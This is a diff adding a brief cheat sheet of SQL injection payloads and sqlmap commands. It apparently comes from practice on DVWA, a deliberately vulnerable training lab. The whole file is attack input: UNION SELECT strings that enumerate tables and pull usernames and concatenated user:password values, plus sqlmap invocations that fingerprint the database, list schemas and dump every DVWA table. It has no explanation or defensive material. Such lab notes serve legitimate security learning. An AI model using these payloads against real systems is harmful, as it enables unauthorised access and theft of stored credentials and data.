@@ -1,0 +1,21 @@
+SQL (set security level to low)
+
+1' UNION SELECT 1,2,3;-- 
+
+1' UNION SELECT 1,2,3;-- 
+
+1' UNION SELECT 1,table_name FROM information_schema.tables;-- 
+
+1' UNION SELECT 1,user FROM users;-- 
+
+1' UNION SELECT 1,concat(user,':',password) FROM users;-- 
+
+1' UNION SELECT 1,@@datadir-- 
+
+sqlmap -r sql.req --current-user --is-dba  --current-db --hostname
+
+sqlmap -r sql.req --dbs
+
+sqlmap -r sql.req -D dvwa --tables
+
+sqlmap -r sql.req -D dvwa --dump
